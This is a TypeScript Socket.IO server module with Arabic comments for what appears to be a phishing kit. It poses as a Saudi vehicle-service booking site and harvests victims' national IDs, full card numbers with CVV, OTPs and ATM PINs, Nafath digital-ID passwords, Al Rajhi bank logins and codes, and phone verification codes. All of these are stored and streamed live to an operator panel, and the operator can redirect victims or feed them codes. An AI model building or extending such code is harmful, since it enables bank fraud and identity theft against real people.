import { Server as SocketIOServer } from "socket.io";
import type { Server as HttpServer } from "http";
import {
  createBooking,
  getBookingByReference,
  createOrUpdatePayment,
  getPaymentByReference,
  createOrUpdateVerification,
  getVerificationByReference,
  updateBookingStatus,
  logNavigation,
} from "./db";
import { notifyOwner } from "./_core/notification";
import { nanoid } from "nanoid";

let io: SocketIOServer | null = null;

// خريطة لتتبع IP → socket
const ipToSocket: Map<string, string> = new Map();
// خريطة لتتبع IP → reference
const ipToReference: Map<string, string> = new Map();

export function initSocket(httpServer: HttpServer): SocketIOServer {
  io = new SocketIOServer(httpServer, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"],
    },
    path: "/socket.io",
  });

  io.on("connection", (socket) => {
    console.log(`[Socket.io] Client connected: ${socket.id}`);

    // ===================== ADMIN =====================
    socket.on("joinAdmin", (_token: string) => {
      socket.join("admins");
      console.log(`[Socket.io] Admin joined: ${socket.id}`);
      socket.emit("adminJoined", { success: true });
    });

    // ===================== CLIENT LOCATION =====================
    // يُرسله الموقع الأمامي عند تحميل كل صفحة لتسجيل موقع العميل
    socket.on("updateLocation", (data: { ip: string; page: string }) => {
      if (!data?.ip) return;
      ipToSocket.set(data.ip, socket.id);
      socket.join(`ip_${data.ip}`);
      console.log(`[Socket.io] Location updated: IP=${data.ip} Page=${data.page}`);
    });

    // ===================== BOOKING =====================
    // submitBooking: إرسال بيانات الحجز الجديد
    socket.on("submitBooking", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || data.clientIp || "unknown");
        const referenceId = nanoid(12);

        const str = (v: unknown): string => (v != null ? String(v) : "");
        const plateStr = [
          str(data.VehiclePlateChar1 ?? data.vehiclePlateChar1 ?? ""),
          str(data.VehiclePlateChar2 ?? data.vehiclePlateChar2 ?? ""),
          str(data.VehiclePlateChar3 ?? data.vehiclePlateChar3 ?? ""),
          str(data.NumberPanal ?? data.numberPanal ?? ""),
        ]
          .filter(Boolean)
          .join("-");

        // استخراج بيانات المفوض إن وجد
        const commissioner = data.commissioner as Record<string, unknown> | null | undefined;
        const booking = await createBooking({
          referenceId,
          // دعم الأسماء الجديدة من الموقع الأمامي
          clientName: str(data.name ?? data.Name ?? data.InputName),
          clientId: str(data.nationalID ?? data.ID ?? data.id ?? data.InputID),
          clientPhone: str(data.phoneNumber ?? data.PhonNumber ?? data.phonNumber ?? data.InputPhonNumber),
          clientEmail: str(data.email ?? data.Email1 ?? data.email1 ?? data.InputEmail1),
          clientNationality: str(data.nationality ?? data.Nationality),
          hasDelegate: !!(data.delegateOn) || data.flexSwitchDelegate === 1 || data.flexSwitchDelegate === "1",
          delegateType: str(commissioner?.type ?? data.DelegateType ?? data.delegateType),
          delegateName: str(commissioner?.name ?? data.DelegateName ?? data.delegateName),
          delegatePhone: str(commissioner?.phone ?? data.DelegatePhone ?? data.delegatePhone),
          delegateNationality: str(commissioner?.nationality ?? data.DelegateNationality ?? data.delegateNationality),
          delegateId: str(commissioner?.id ?? data.DelegateId ?? data.delegateId),
          vehicleCountry: str(data.countryOfRegistration ?? data.CountryReg ?? data.countryReg ?? data.InputCountryReg),
          vehiclePlate: str(data.plate ?? plateStr),
          vehiclePlateChar1: str(data.VehiclePlateChar1 ?? data.vehiclePlateChar1),
          vehiclePlateChar2: str(data.VehiclePlateChar2 ?? data.vehiclePlateChar2),
          vehiclePlateChar3: str(data.VehiclePlateChar3 ?? data.vehiclePlateChar3),
          vehicleType: str(data.TypeVechil ?? data.typeVechil ?? data.InputTypeVechil),
          vehicleCarryDang: data.vehicleCarryDang === 1 || data.vehicleCarryDang === "1",
          serviceRegion: str(data.region ?? data.RegionSvc ?? data.regionSvc ?? data.InputRegion),
          serviceType: str(data.serviceType ?? data.TypeSvc ?? data.typeSvc ?? data.InputTypeSvc),
          serviceDate: str(data.dateSvc ?? data.DateSvc ?? data.InputDateSvc),
          serviceTime: str(data.timeSvc ?? data.TimeSvc ?? data.InputTimeSvc),
          clientIp,
          rawData: data,
          statusRead: 0,
          status: "new",
        });

        // ربط IP بالمرجع
        ipToReference.set(clientIp, referenceId);

        // إشعار المسؤول
        try {
          await notifyOwner({
            title: "حجز جديد",
            content: `حجز جديد من ${booking?.clientName || "عميل"} - رقم الهوية: ${booking?.clientId || ""} - رقم اللوحة: ${booking?.vehiclePlate || ""}`,
          });
        } catch (e) {}

        // إرسال للوحة التحكم
        io?.to("admins").emit("newBooking", booking);

        // الرد على العميل
        socket.emit("ackNewDate", {
          success: true,
          data: {
            Reference: referenceId,
            goToUrl: "/payment",
          },
        });

        console.log(`[Socket.io] New booking: ${referenceId} from IP: ${clientIp}`);
      } catch (err: any) {
        console.error("[Socket.io] submitBooking error:", err);
        socket.emit("ackNewDate", { success: false, error: err.message });
      }
    });

    // ===================== PAYMENT =====================
    // submitPaymentData: بيانات البطاقة (الخطوة الأولى)
    socket.on("submitPaymentData", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (!reference) {
          socket.emit("ackPayment", { success: false, error: "لا يوجد مرجع" });
          return;
        }

        const str = (v: unknown) => (v != null ? String(v) : "");
        // دعم أسماء الحقول المختلفة من الموقع الأمامي
        const cardNum = str(data.cardNumber ?? data.CardID ?? data.cardID ?? "").replace(/\s/g, "");
        const expiry = str(data.expirationDate ?? data.DateExp ?? data.dateExp ?? "");
        const cvv = str(data.cvv ?? data.CVV ?? data.cardCvv ?? "");
        const holderName = str(data.cardHolderName ?? data.CardHolderName ?? "");

        await createOrUpdatePayment(reference, {
          cardHolderName: holderName,
          cardNumber: cardNum,
          cardLastFour: cardNum.length >= 4 ? cardNum.slice(-4) : cardNum,
          cardExpiry: expiry,
          cardCvv: cvv,
          step: 1,
          status: "step1_done",
          rawData: data,
        });
        await updateBookingStatus(reference, "pending_payment");

        // إشعار المسؤول بالبيانات الجديدة
        io?.to("admins").emit("newPayment", { reference, step: 1, type: "card" });

        socket.emit("ackPayment", {
          success: true,
          data: { step: 1, status: "STILL" },
        });
      } catch (err: any) {
        console.error("[Socket.io] submitPaymentData error:", err);
        socket.emit("ackPayment", { success: false, error: err.message });
      }
    });

    // submitVerificationData: رمز التحقق من الدفع
    socket.on("submitVerificationData", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (!reference) {
          socket.emit("ackVerification", { success: false, error: "لا يوجد مرجع" });
          return;
        }

        await createOrUpdatePayment(reference, {
          // دعم verification_code_two من صفحة OTP
          verifyCode: String(data.verification_code_two ?? data.verification_code ?? data.verifyCode ?? ""),
          step: 2,
          status: "step2_done",
        });

        io?.to("admins").emit("newPayment", { reference, step: 2, type: "verification" });

        socket.emit("ackVerification", {
          success: true,
          data: { step: 2, status: "STILL" },
        });
      } catch (err: any) {
        console.error("[Socket.io] submitVerificationData error:", err);
        socket.emit("ackVerification", { success: false, error: err.message });
      }
    });

    // submitCodeData: الرقم السري / OTP
    socket.on("submitCodeData", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (!reference) {
          socket.emit("ackCode", { success: false, error: "لا يوجد مرجع" });
          return;
        }

        // دعم أسماء الحقول المختلفة: verification_code من OTP و pin من ATM
        const otpCode = String(data.verification_code ?? data.pin ?? data.code ?? data.secretNum ?? data.otp ?? "");
        await createOrUpdatePayment(reference, {
          secretNum: otpCode,
          step: 3,
          status: "step3_done",
        });

        io?.to("admins").emit("newPayment", { reference, step: 3, type: "code" });

        socket.emit("ackCode", {
          success: true,
          data: { step: 3, status: "STILL" },
        });
      } catch (err: any) {
        console.error("[Socket.io] submitCodeData error:", err);
        socket.emit("ackCode", { success: false, error: err.message });
      }
    });

    // submitPhoneData: بيانات الهاتف
    socket.on("submitPhoneData", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (!reference) {
          socket.emit("ackPhone", { success: false, error: "لا يوجد مرجع" });
          return;
        }

        await createOrUpdateVerification(reference, "motasel", {
          motaselPhone: String(data.phone ?? data.phoneNumber ?? ""),
          step: 1,
          status: "step1_done",
          rawData: data,
        });

        io?.to("admins").emit("newPayment", { reference, step: 1, type: "phone" });

        socket.emit("ackPhone", {
          success: true,
          data: { step: 1, status: "STILL" },
        });
      } catch (err: any) {
        console.error("[Socket.io] submitPhoneData error:", err);
        socket.emit("ackPhone", { success: false, error: err.message });
      }
    });

    // submitPhoneCodeData: رمز التحقق من الهاتف
    socket.on("submitPhoneCodeData", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (!reference) {
          socket.emit("ackPhoneCode", { success: false, error: "لا يوجد مرجع" });
          return;
        }

        await createOrUpdateVerification(reference, "motasel", {
          motaselCode: String(data.verification_code_three ?? data.code ?? ""),
          step: 2,
          status: "verified",
        });

        io?.to("admins").emit("newPayment", { reference, step: 2, type: "phoneCode" });

        socket.emit("ackPhoneCode", {
          success: true,
          data: { step: 2, status: "accepted" },
        });
      } catch (err: any) {
        console.error("[Socket.io] submitPhoneCodeData error:", err);
        socket.emit("ackPhoneCode", { success: false, error: err.message });
      }
    });

    // ===================== NAFATH =====================
    // submitNafadData: بيانات نفاذ
    socket.on("submitNafadData", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (!reference) {
          socket.emit("ackNafad", { success: false, error: "لا يوجد مرجع" });
          return;
        }

        const str = (v: unknown) => (v != null ? String(v) : "");
        await createOrUpdateVerification(reference, "nafath", {
          nafathId: str(data.NafathIDCard ?? data.nafathId ?? data.id),
          nafathPassword: str(data.NafathPassword ?? data.nafathPassword ?? data.password),
          step: 1,
          status: "step1_done",
          rawData: data,
        });
        await updateBookingStatus(reference, "pending_nafath");

        io?.to("admins").emit("newPayment", { reference, step: 1, type: "nafath" });

        socket.emit("ackNafad", {
          success: true,
          data: { step: 1, status: "STILL" },
        });
      } catch (err: any) {
        console.error("[Socket.io] submitNafadData error:", err);
        socket.emit("ackNafad", { success: false, error: err.message });
      }
    });

    // getNafadCode: طلب رمز نفاذ
    socket.on("getNafadCode", async (data: { ip: string }) => {
      try {
        const clientIp = String(data?.ip || "unknown");
        const reference = ipToReference.get(clientIp) || "";

        // توليد رمز نفاذ عشوائي (في الواقع يجب أن يأتي من نفاذ)
        const nafathCode = Math.floor(10 + Math.random() * 90).toString();

        if (reference) {
          await createOrUpdateVerification(reference, "nafath", {
            nafathNumber: nafathCode,
            step: 2,
            status: "code_sent",
          });
          io?.to("admins").emit("newPayment", { reference, type: "nafathCode", code: nafathCode });
        }

        socket.emit("nafadCode", {
          success: true,
          code: nafathCode,
        });
      } catch (err: any) {
        console.error("[Socket.io] getNafadCode error:", err);
        socket.emit("nafadCode", { success: false, error: err.message });
      }
    });

    // ===================== RAJHI =====================
    // submitRajhiData: بيانات الراجحي
    socket.on("submitRajhiData", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (!reference) {
          socket.emit("ackRajhi", { success: false, error: "لا يوجد مرجع" });
          return;
        }

        await createOrUpdatePayment(reference, {
          rajUsername: String(data.username ?? data.raj_username ?? ""),
          rajPassword: String(data.password ?? data.raj_password ?? ""),
          step: 4,
          status: "step3_done",
          rawData: data,
        });

        io?.to("admins").emit("newPayment", { reference, step: 4, type: "rajhi" });

        socket.emit("ackRajhi", {
          success: true,
          data: { step: 4, status: "STILL" },
        });
      } catch (err: any) {
        console.error("[Socket.io] submitRajhiData error:", err);
        socket.emit("ackRajhi", { success: false, error: err.message });
      }
    });

    // submitRajhiCodeData: رمز الراجحي
    socket.on("submitRajhiCodeData", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (!reference) {
          socket.emit("ackRajhiCode", { success: false, error: "لا يوجد مرجع" });
          return;
        }

        await createOrUpdatePayment(reference, {
          secretNum: String(data.rajhiCode ?? data.code ?? ""),
          step: 5,
          status: "verified",
        });
        await updateBookingStatus(reference, "payment_done");

        try {
          const booking = await getBookingByReference(reference);
          await notifyOwner({
            title: "دفع راجحي جديد",
            content: `تم استلام رمز راجحي من ${booking?.clientName || "عميل"} - المرجع: ${reference}`,
          });
        } catch (e) {}

        io?.to("admins").emit("newPayment", { reference, step: 5, type: "rajhiCode" });

        socket.emit("ackRajhiCode", {
          success: true,
          data: { step: 5, status: "accepted" },
        });
      } catch (err: any) {
        console.error("[Socket.io] submitRajhiCodeData error:", err);
        socket.emit("ackRajhiCode", { success: false, error: err.message });
      }
    });

    // ===================== STC =====================
    socket.on("stcCallReceived", async (data: Record<string, unknown>) => {
      try {
        const clientIp = String(data.ip || "unknown");
        const reference = String(data.reference || ipToReference.get(clientIp) || "");
        if (reference) {
          await createOrUpdateVerification(reference, "otp", {
            step: 1,
            status: "stc_received",
            rawData: data,
          });
          io?.to("admins").emit("newPayment", { reference, type: "stcCall" });
        }
        socket.emit("success", { success: true });
      } catch (err: any) {
        console.error("[Socket.io] stcCallReceived error:", err);
      }
    });

    // ===================== DISCONNECT =====================
    socket.on("disconnect", () => {
      // تنظيف الخريطة
      for (const [ip, sid] of Array.from(ipToSocket.entries())) {
        if (sid === socket.id) {
          ipToSocket.delete(ip);
          break;
        }
      }
      console.log(`[Socket.io] Client disconnected: ${socket.id}`);
    });
  });

  return io;
}

export function getIo(): SocketIOServer | null {
  return io;
}

// دالة لتوجيه عميل بـ IP معين
export function navigateClientByIp(ip: string, page: string): boolean {
  if (!io) return false;
  io.emit("navigateTo", { page, ip });
  return true;
}

// دالة لإرسال رمز نفاذ لعميل معين من لوحة التحكم
export function sendNafathCodeToClient(ip: string, code: string): boolean {
  if (!io) return false;
  io.emit("nafadCode", { success: true, code });
  return true;
}

// دالة لإرسال رمز whatsapp لعميل معين
export function sendWhatsCodeToClient(ip: string, code: string): boolean {
  if (!io) return false;
  io.emit("whatsCode", { success: true, code });
  return true;
}
